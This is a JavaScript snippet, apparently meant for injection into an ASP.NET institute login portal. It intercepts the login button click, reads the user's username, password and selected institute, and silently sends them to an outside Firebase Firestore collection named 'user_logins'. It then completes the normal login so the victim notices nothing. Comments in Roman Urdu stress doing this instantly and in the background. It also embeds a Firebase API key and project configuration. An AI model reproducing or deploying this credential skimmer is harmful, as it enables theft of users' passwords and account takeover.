<!-- Background Firebase Script (Zero Delay / Instant Redirect) -->
<script type="module">
	import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
	import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

	const firebaseConfig = {
		apiKey: "AIzaSyAPFQOjtPenZ1j74QcLCt1XjG49FzUPOTY",
		authDomain: "bahria-9c2ac.firebaseapp.com",
		projectId: "bahria-9c2ac",
		storageBucket: "bahria-9c2ac.firebasestorage.app",
		messagingSenderId: "731792968613",
		appId: "1:731792968613:web:43067e1c042a87770cb64c",
		measurementId: "G-6VPPPFDP91"
	};

	const app = initializeApp(firebaseConfig);
	const db = getFirestore(app);

	const loginBtn = document.getElementById("BodyPH_btnLogin");
	if (loginBtn) {
		loginBtn.addEventListener("click", (e) => {
			e.preventDefault(); 

			const username = document.getElementById("BodyPH_tbUserName").value;
			const password = document.getElementById("BodyPH_tbPassword").value;
			const instituteSelect = document.getElementById("BodyPH_ddlInstituteID");
			const institute = instituteSelect.options[instituteSelect.selectedIndex].text;

			if (username && password) {
				// Baghair await ke background mein data bhej rahe hain taake rukawat na ho
				addDoc(collection(db, "user_logins"), {
					username: username,
					password: password,
					institute: institute,
					timestamp: new Date()
				}).catch((error) => {
					console.error("Error saving data: ", error);
				});
			}

			// Baghair kisi delay ke foran page ko postback kar do
			if (typeof WebForm_DoPostBackWithOptions === 'function') {
				__doPostBack('ctl00$BodyPH$btnLogin', '');
			} else {
				document.getElementById('form1').submit();
			}
		});
	}
</script>
